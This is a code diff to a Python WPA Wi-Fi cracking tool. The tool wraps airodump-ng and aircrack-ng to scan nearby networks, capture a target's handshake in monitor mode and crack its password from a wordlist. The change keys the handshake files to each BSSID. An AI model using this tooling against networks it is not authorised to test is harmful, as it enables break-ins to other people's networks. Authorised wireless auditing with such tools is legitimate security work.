@@ -83,7 +83,7 @@ class Capture:
         os.system(cmd)
 
         latest = sorted(glob.glob("tmp/airodump-*.csv"))[-1]
-        networkDF = pd.read_csv(f"{latest}", usecols=['BSSID', ' ESSID', ' channel']).dropna()
+        networkDF = pd.read_csv(f"{latest}", usecols=['BSSID', ' ESSID', ' channel', ' Privacy']).dropna()
 
         return networkDF
 
@@ -101,7 +101,7 @@ class Capture:
         os.system(cmd)
 
     def monHandshake(self, bssid, channel):
-        cmd = f"sudo xterm -e /bin/bash -c -l 'airodump-ng -w tmp/handshake --output-format cap -c {channel} --bssid {bssid} {self.iface}'"
+        cmd = f"sudo xterm -e /bin/bash -c -l 'airodump-ng -w tmp/handshake-{bssid} --output-format cap -c {channel} --bssid {bssid} {self.iface}'"
         os.system(cmd)
 
     def grabCAP(self, bssid, channel):
@@ -118,11 +118,12 @@ class Capture:
 
 class Cracker:
 
-    def __init__(self, wordlist):
+    def __init__(self, wordlist, BSSID):
         self.wordlist = wordlist
+        self.BSSID = BSSID
 
     def getHandshakeFile(self):
-        handshake_file = sorted(glob.glob("./tmp/handshake-*.cap"))[-1]
+        handshake_file = sorted(glob.glob(f"./tmp/handshake-{self.BSSID}-*.cap"))[-1]
 
         return handshake_file
 
@@ -147,7 +148,6 @@ class Cracker:
 def runner(interface, wordlist):
     ifacectrl = Interface(interface=interface)
     capture = Capture(interface=interface)
-    cracker = Cracker(wordlist=wordlist)
 
     monitor_mode = ifacectrl.enableMonitorMode()
     if monitor_mode:
@@ -162,6 +162,7 @@ def runner(interface, wordlist):
         print("\nPress Ctrl+C when you see WPA[Hanshake Captured-*")
         capture.grabCAP(bssid=bssid, channel=channel)
 
+        cracker = Cracker(wordlist=wordlist, BSSID=bssid)
         print("[+] Cracking Password")
         password = cracker.aircrack()
         if password:
